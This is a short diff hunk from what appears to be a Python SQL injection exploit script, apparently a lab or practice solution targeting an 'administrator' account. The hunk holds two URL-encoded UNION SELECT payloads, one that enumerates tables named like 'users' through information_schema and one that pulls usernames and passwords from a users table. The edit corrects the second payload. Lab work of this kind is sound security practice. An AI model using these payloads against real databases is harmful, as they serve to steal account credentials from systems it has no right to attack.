@@ -17,7 +17,7 @@ admin_username = 'administrator'
 password = ''
 
 poc_payload_for_users_table = "'union+SELECT+null,TABLE_NAME+FROM+information_schema.tables+where+TABLE_NAME+LIKE+'%25users%25'--"
-payload_to_get_users_with_passwords = "='union+SELECT+username,password+FROM+users--"
+payload_to_get_users_with_passwords = "'union+SELECT+username,password+FROM+users--"
 
 
 def filter_url():
